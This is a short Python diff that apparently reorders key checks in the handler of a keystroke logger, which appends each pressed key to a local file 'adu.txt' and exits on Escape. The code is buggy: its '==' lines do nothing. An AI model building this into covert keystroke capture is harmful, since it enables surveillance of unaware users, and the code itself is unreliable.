@@ -7,10 +7,10 @@ def anoymous(key) :
     key=key.replace("'","")
     if key == "Key.esc" : 
         raise SystemExit(0) 
-    if key == "Key.alt_l" :
-        key == "\n"  
     if key == "Key.tab" :
         key == "\n"
+    if key == "Key.alt_l" :
+        key == "\n"  
 
     with open( "adu.txt" ,"a") as file :
         file.write(key) 
